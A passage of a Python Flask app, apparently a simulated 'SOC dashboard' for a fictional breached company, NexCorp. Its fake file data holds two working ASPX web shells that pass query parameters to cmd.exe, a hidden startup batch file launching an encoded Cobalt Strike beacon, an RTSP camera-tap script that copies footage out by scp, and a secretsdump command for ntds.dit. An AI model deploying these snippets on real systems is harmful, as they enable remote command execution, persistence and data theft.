"C:\\Windows\\NTDS\\ntds.dit": "[Binary - 11 MB]\nActive Directory Database - NEXCORP.LOCAL\n\nContains:\n- All domain user accounts + password hashes\n- Computer accounts (all domain machines)\n- Group Policy Objects\n- Kerberos keys\n\nExtract: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
"C:\\Temp\\beacon.exe": "[PE32+ - 184 KB]\nCobalt Strike Beacon - HTTPS\nC2: https://10.0.0.44:443\nSleep: 60s + 20% jitter\nInjected into: explorer.exe PID 2144",
"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat": "@echo off\nREM Windows Update Service\npowershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0ACAAQwA6AFwAVABlAG0AcABcAGIAZQBhAGMAbwBuAC4AZQB4AGUA\n:: Decodes to: start C:\\Temp\\beacon.exe",
"/etc/hikvision/device.conf": "[Device]\nDeviceName=NexCorp-CCTV-GF\nDeviceModel=DS-7608NI-K2\nSerialNo=DS-7608NI-K2/A2023001\nFirmwareVersion=V3.4.102 build 200508\n\n[Network]\nIPAddress=192.168.10.5\nGatewayIPAddress=192.168.10.1\nHTTPPort=80\n\n[RTSP]\nEnabled=true\nPort=554\nAuthentication=disable",
"/etc/hikvision/users.conf": "[Users]\nadmin    : 12345          : Administrator\noperator : nexcorp2024    : Operator\nviewer   : viewer123      : ViewOnly\nbackup   : Bkup_cctv99    : Operator\n\n[RemoteAccess]\nEnabled=true\nAllowedIPs=0.0.0.0/0\nLastLogin=2026-03-21 07:19:02 from 10.0.0.44",
"/etc/hikvision/channels.conf": "[Channels]\nCH01=Gate-Main-Entrance  | LIVE | rtsp://192.168.10.5:554/Streaming/Channels/101\nCH02=Main-Lobby          | LIVE | rtsp://192.168.10.5:554/Streaming/Channels/201\nCH03=Server-Room         | LIVE | rtsp://192.168.10.5:554/Streaming/Channels/301\nCH04=Emergency-Exit      | LIVE | rtsp://192.168.10.5:554/Streaming/Channels/401\nCH05=Armory              | LIVE | rtsp://192.168.10.5:554/Streaming/Channels/501\n\n[Auth]\nRTSPAuthentication=disable\nDisabled by admin on: 2025-11-12",
"/etc/hikvision/recording.conf": "[Recording]\nRetentionDays=30\nStoragePath=/mnt/nvr\nContinuous=yes\nAllDays=yes\nStartTime=00:00\nEndTime=23:59",
"/etc/hikvision/email_alerts.conf": "[EmailAlerts]\nEnabled=true\nSMTPServer=172.16.4.18\nSender=cctv@nexcorp.com\nPassword=CCTV_Nx@2024\nRecipient=security@nexcorp.com",
"/root/stream_tap.sh": "#!/bin/sh\nCH=${1:-3}\nRTSP=rtsp://admin:12345@192.168.10.5:554/Streaming/Channels/${CH}01\nOUT=/tmp/cap_ch0${CH}_$(date +%Y%m%d_%H%M%S).mp4\necho Tapping channel $CH: $RTSP\nffmpeg -loglevel quiet -rtsp_transport tcp -i $RTSP -t 60 -c copy $OUT &\necho PID $! - running in background\necho Transfer: scp $OUT 10.0.0.44:/received/",
"/root/rtsp_pull.py": "channels = {\n    1: 'Gate-Main-Entrance',\n    2: 'Main-Lobby',\n    3: 'Server-Room',\n    4: 'Emergency-Exit',\n    5: 'Armory'\n}\n\nfor ch, name in channels.items():\n    url = f'rtsp://admin:12345@192.168.10.5:554/Streaming/Channels/{ch}01'\n    out = f'/tmp/{name.lower()}.mp4'\n    print(f'[+] Tapping {name}: {url}')",
"/tmp/rtsp_session.log": "2026-03-21 07:19:02 SSH established from 10.0.0.44\n2026-03-21 07:19:15 Auth OK - admin:12345\n2026-03-21 07:20:01 CH03 Server-Room RTSP accessed\n2026-03-21 07:20:44 CH05 Armory RTSP accessed\n2026-03-21 07:21:12 stream_tap.sh executed CH03\n2026-03-21 07:22:55 SCP transfer started to 10.0.0.44\n2026-03-21 07:31:04 cap_ch03 transferred (4.1 GB)",
"C:\\inetpub\\wwwroot\\owa\\auth\\svcdiag.aspx": "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nvoid Page_Load(object sender, EventArgs e) {\n    string cmd = Request.QueryString[\"cmd\"];\n    if (!string.IsNullOrEmpty(cmd)) {\n        var p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.Arguments = \"/c \" + cmd;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.StartInfo.UseShellExecute = false;\n        p.Start();\n        Response.Write(p.StandardOutput.ReadToEnd());\n    }\n}\n</script>",
"C:\\Exports\\ad_users_dump.txt": "# Active Directory Users - NEXCORP.LOCAL\n# Exported: 2026-03-21 00:14:32  Total: 214 accounts\n\nkadmin          | kadmin@nexcorp.com         | Domain Admin\nAdministrator   | admin@nexcorp.com          | Domain Admin\nceo.nexcorp     | ceo@nexcorp.com            | Executive\ncfo.nexcorp     | cfo@nexcorp.com            | Finance\ncto.nexcorp     | cto@nexcorp.com            | IT Admin\nhr.manager      | hr.manager@nexcorp.com     | HR\njbrown          | jbrown@nexcorp.com         | IT Admin\nmfemi           | mfemi@nexcorp.com          | Developer\n[+206 accounts]",
"C:\\Temp\\proxylogon_payload.aspx": "<%@ Page Language=\"C#\" %>\n<!-- CVE-2021-26855 ProxyLogon payload -->\n<!-- Dropped to /owa/auth/ via SSRF -->\n<script runat=\"server\">\nvoid Page_Load(object sender, EventArgs e) {\n    string c = Request[\"c\"];\n    if(c != null) {\n        var p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.Arguments = \"/c \" + c;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.Start();\n        Response.Write(p.StandardOutput.ReadToEnd());\n    }\n}\n</script>",
"C:\\Users\\Administrator\\Desktop\\recovery_key2.txt": "Exchange 2019 Recovery\n\nAdmin: administrator / Exch@nge_Nx2024!\nECP: https://172.16.4.18/ecp\n\nBackup location: \\\\172.16.4.50\\exchange_backups\\\nBackup password: ExchBkup_Nx#2024"
}

FS = {
0: {
  "/": [("bin","d",""),("etc","d",""),("home","d",""),("opt","d",""),("root","d",""),("tmp","d",""),("usr","d",""),("var","d","")],
  "/root": [(".bash_history","f","4.1K",True),(".ssh","d",""),("loot","d",""),("recon","d",""),("tools","d","")],
  "/root/.ssh": [("authorized_keys","f","412",True),("id_rsa","f","1.7K",True),("id_rsa.pub","f","401",False),("known_hosts","f","2.1K",False)],
  "/root/recon": [("nmap_full_internal.txt","f","48K",False),("passwords_found.txt","f","4.8K",True),("subdomain_enum.txt","f","8.4K",False),("users_harvested.txt","f","2.1K",True)],
  "/root/loot": [("db_credentials.txt","f","1.4K",True),("nexcorp_employees.sql","f","812K",True),("session_tokens.txt","f","8.8K",True),("shadow_hashes.txt","f","4.3K",True)],
  "/root/tools": [("chisel","f","7.8M",False),("linpeas.sh","f","748K",False),("pspy64","f","3.0M",False),("socat","f","2.1M",False)],
  "/etc": [("apache2","d",""),("cron.d","d",""),("mysql","d",""),("ssh","d",""),("crontab","f","1.1K",True),("hostname","f","28",False),("hosts","f","312",False),("os-release","f","214",False),("passwd","f","2.8K",False),("shadow","f","4.3K",True),("sudoers","f","4.8K",True)],
  "/etc/ssh": [("sshd_config","f","3.2K",False)],
  "/etc/apache2": [("apache2.conf","f","7.1K",False),("ports.conf","f","512",False),("sites-enabled","d",""),("mods-enabled","d","")],
  "/var/www/html": [(".htaccess","f","1.2K",False),("admin","d",""),("api","d",""),("config","d",""),("index.php","f","8.4K",False),("uploads","d",""),("wp-config.php","f","3.1K",True)],
  "/var/www/html/config": [("app.php","f","5.7K",False),("db.php","f","2.1K",True),("mail.php","f","1.4K",False),("stripe_keys.php","f","812",True)],
  "/opt/nexcorp": [("backups","d",""),("config","d",""),("data","d",""),("finance","d",""),("hr","d",""),("scripts","d","")],
  "/opt/nexcorp/config": [("api_keys.txt","f","2.1K",True),("jwt_secret.txt","f","128",True),("production.env","f","3.2K",True)],
  "/opt/nexcorp/finance": [("annual_report_2025.pdf","f","8.8M",False),("bank_details.xlsx","f","84K",True),("board_salaries.xlsx","f","44K",True),("invoices_2026.zip","f","12M",False),("q3_payroll.csv","f","241K",True),("q4_payroll.csv","f","248K",True)],
  "/opt/nexcorp/scripts": [("db_backup.sh","f","2.1K",True),("deploy_check.sh","f","1.4K",False),("healthcheck.sh","f","884",True),("startup.sh","f","512",False)],
  "/opt/nexcorp/backups": [("db_backup_2026-03-18.tar.gz","f","4.8G",False),("db_backup_2026-03-11.tar.gz","f","4.7G",False),("full_backup_2026-02-28.tar.gz","f","18G",False)],
  "/home": [("aokeke","d",""),("deploy","d",""),("jbrown","d",""),("mfemi","d","")],
  "/home/jbrown": [(".bash_history","f","2.1K",False),(".env","f","1.8K",True),(".ssh","d",""),("TODO.txt","f","412",False),("deploy_keys","d",""),("notes.txt","f","884",True)],
  "/home/jbrown/deploy_keys": [("prod_deploy_key","f","1.7K",True),("staging_deploy_key","f","1.7K",True)],
  "/home/mfemi": [(".bash_history","f","1.8K",False),("passwords.txt","f","1.1K",True),("projects","d","")],
  "/tmp": [(".svc","f","184",True),(".x11-unix","d",""),("linpeas_out.txt","f","288K",True),("loot.tar.gz","f","4.2M",True)]
},
1: {
  "/": [("etc","d",""),("home","d",""),("root","d",""),("tmp","d",""),("var","d","")],
  "/root": [(".bash_history","f","5.8K",False),(".backdoor","d",""),(".mysql_history","f","18K",True),(".ssh","d",""),("dump","d",""),("exfil","d","")],
  "/root/.ssh": [("authorized_keys","f","412",True),("id_rsa","f","1.7K",True)],
  "/root/dump": [("customers_pii.csv","f","4.8M",True),("nexcorp_full_2026-03-21.sql","f","2.1G",True),("schema.txt","f","18K",False),("users_plain.txt","f","44K",True)],
  "/root/exfil": [("mysql_exfil.py","f","3.4K",True),("transfer.sh","f","884",True)],
  "/root/.backdoor": [("config.json","f","512",True),("svc","f","184K",False)],
  "/etc": [("hostname","f","22",False),("hosts","f","248",False),("mysql","d",""),("passwd","f","1.8K",False),("shadow","f","2.8K",True)],
  "/etc/mysql": [("debian.cnf","f","3.2K",True),("my.cnf","f","4.2K",False)],
  "/var/lib/mysql/nexcorp_prod": [("customers.ibd","f","2.1G",True),("db.opt","f","68",False),("employees.ibd","f","890M",True),("invoices.ibd","f","440M",False),("payments.ibd","f","340M",True),("sessions.ibd","f","88M",False),("users.ibd","f","210M",True)],
  "/home": [("dbadmin","d","")],
  "/home/dbadmin": [(".bash_history","f","3.3K",False),(".my.cnf","f","84",True),("backup.sh","f","2.1K",False),("creds.txt","f","412",True)],
  "/tmp": [(".hidden_shell","f","1.2K",True),("dumpfile.sql","f","2.1G",True),("mysql_exfil.py","f","3.4K",True)]
},
2: {
  "C:\\": [("ProgramData","d",""),("Program Files","d",""),("Temp","d",""),("Users","d",""),("Windows","d","")],
  "C:\\Users": [("Administrator","d",""),("kadmin","d",""),("Public","d","")],
  "C:\\Users\\kadmin": [(".ssh","d",""),("AppData","d",""),("Desktop","d",""),("Documents","d",""),("Downloads","d","")],
  "C:\\Users\\kadmin\\Desktop": [("VPN_access.txt","f","2.1K",True),("nexcorp_passwords_backup.txt","f","3.2K",True),("server_map.xlsx","f","128K",True)],
  "C:\\Users\\kadmin\\Documents": [("NexCorp_Q1_Budget.xlsx","f","2.8M",True),("VPN_Credentials.docx","f","44K",True),("Work","d","")],
  "C:\\Users\\kadmin\\Documents\\Work": [("Firewall_Rules_Export.csv","f","84K",False),("NexCorp_Network_Diagram.vsdx","f","4.4M",True),("Server_Credentials_MASTER.xlsx","f","188K",True)],
  "C:\\Users\\Administrator": [("Desktop","d",""),("Documents","d","")],
  "C:\\Users\\Administrator\\Desktop": [("exchange_admin_notes.txt","f","3.2K",True),("recovery_key.txt","f","284",True),("server_ips_internal.txt","f","1.1K",True)],
  "C:\\Temp": [("SharpHound.exe","f","884K",False),("beacon.exe","f","184K",True),("bloodhound_output.zip","f","2.1M",False),("lsass.dmp","f","44M",True),("mimikatz_output.txt","f","28K",True),("nc.exe","f","28K",False),("winpeas.exe","f","1.8M",False)],
  "C:\\Windows\\NTDS": [("edb.log","f","4.1M",False),("ntds.dit","f","11M",True)],
  "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup": [("WindowsUpdate.bat","f","1.2K",True),("svchost32.exe","f","184K",True)]
},
3: {
  "/": [("bin","d",""),("etc","d",""),("mnt","d",""),("root","d",""),("tmp","d",""),("var","d","")],
  "/root": [("rtsp_pull.py","f","1.4K",True),("stream_tap.sh","f","884",True)],
  "/etc": [("hikvision","d",""),("hostname","f","18",False),("hosts","f","214",False),("passwd","f","812",False),("shadow","f","412",True)],
  "/etc/hikvision": [("channels.conf","f","2.8K",True),("device.conf","f","8.2K",False),("email_alerts.conf","f","1.8K",False),("recording.conf","f","4.1K",False),("users.conf","f","1.4K",True)],
  "/mnt": [("nvr","d",""),("usb","d","")],
  "/mnt/nvr": [("2026-03-22","d",""),("2026-03-23","d",""),("2026-03-24","d","")],
  "/mnt/nvr/2026-03-24": [("ch01_gate.mp4","f","4.1G",False),("ch02_lobby.mp4","f","4.1G",False),("ch03_serverroom.mp4","f","4.1G",True),("ch04_emergency_exit.mp4","f","4.1G",False),("ch05_armory.mp4","f","4.1G",True)],
  "/mnt/nvr/2026-03-23": [("ch01_gate.mp4","f","4.1G",False),("ch02_lobby.mp4","f","4.1G",False),("ch03_serverroom.mp4","f","4.1G",False),("ch04_emergency_exit.mp4","f","4.1G",False),("ch05_armory.mp4","f","4.1G",False)],
  "/tmp": [("rtsp_session.log","f","18K",True),("stream_tap.sh","f","884",True)],
  "/var": [("log","d",""),("run","d","")]
},
4: {
  "C:\\": [("Exchange","d",""),("Exports","d",""),("Program Files","d",""),("Temp","d",""),("Users","d",""),("Windows","d",""),("inetpub","d","")],
  "C:\\inetpub": [("logs","d",""),("wwwroot","d","")],
  "C:\\inetpub\\wwwroot": [("aspnet_client","d",""),("owa","d","")],
  "C:\\inetpub\\wwwroot\\owa": [("auth","d",""),("resources","d",""),("web.config","f","8.4K",False)],
  "C:\\inetpub\\wwwroot\\owa\\auth": [("errorFE.aspx","f","18K",False),("logon.aspx","f","44K",False),("owaauth.dll","f","284K",False),("svcdiag.aspx","f","6.1K",True)],
  "C:\\Exports": [("ad_users_dump.txt","f","88K",True),("ceo_mailbox_full.pst","f","1.8G",True),("email_addresses_all.txt","f","44K",True),("finance_Q1_Q2.pst","f","740M",True),("hr_all_staff.pst","f","2.1G",True)],
  "C:\\Temp": [("ad_users_dump.txt","f","88K",True),("nc.exe","f","28K",False),("proxylogon_payload.aspx","f","4.2K",True)],
  "C:\\Users\\Administrator": [("Desktop","d",""),("Documents","d","")],
  "C:\\Users\\Administrator\\Desktop": [("exchange_admin_notes.txt","f","3.2K",True),("recovery_key2.txt","f","284",True),("server_ips_internal.txt","f","1.1K",True)],
  "C:\\Exchange\\Config": [("accepted_domains.txt","f","2.1K",False),("edge_config.xml","f","28K",False),("transport_rules.xml","f","18K",False)]
}
}

@app.route("/")
def index():
    return render_template_string(open(os.path.join(BASE,"nexcorp_ui.html")).read())

@app.route("/api/fc")
def api_fc():
    return Response(json.dumps(FC), mimetype="application/json")

@app.route("/api/fs")
def api_fs():
    return Response(json.dumps(FS), mimetype="application/json")

@app.route("/cam/<cam_id>")
def cam(cam_id):
    if cam_id not in ["gate","lobby","serverroom","exit","armory"]:
        abort(404)
    logs_dir = os.path.join(BASE, "logs")
    for ext in ["jpg","jpeg","png","JPG","JPEG","PNG"]:
        p = os.path.join(logs_dir, cam_id + "." + ext)
        if os.path.exists(p):
            return send_from_directory(logs_dir, cam_id + "." + ext)
    abort(404)

if __name__ == "__main__":
    # write HTML file next to script
    html_path = os.path.join(BASE, "nexcorp_ui.html")
    if not os.path.exists(html_path):
        with open(html_path, "w") as f:
            f.write("<!-- placeholder -->")
    print("\n  NexCorp SOC Dashboard v4")
    print("  http://localhost:8888")
    print("  Images: ./logs/gate.jpg  lobby.jpg  serverroom.jpg  exit.jpg  armory.jpg\n")
    app.run(host="0.0.0.0", port=8888, debug=False)
